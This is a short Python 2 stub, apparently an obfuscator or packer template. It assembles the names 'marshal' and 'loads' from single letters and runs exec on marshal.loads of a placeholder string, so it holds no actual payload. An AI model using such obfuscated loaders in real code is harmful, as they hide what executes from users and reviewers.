# -*- coding: utf-8 -*-


j = "r"
o = "s"
g = "a"
d = "h"
z = "l"
c = "d"
v = "o"
n = "m"

i = __import__(n + g + j + o + d + g + z)

exec getattr(i, z + v + g + c + o)("__FINAL_PLACEHOLDER__")
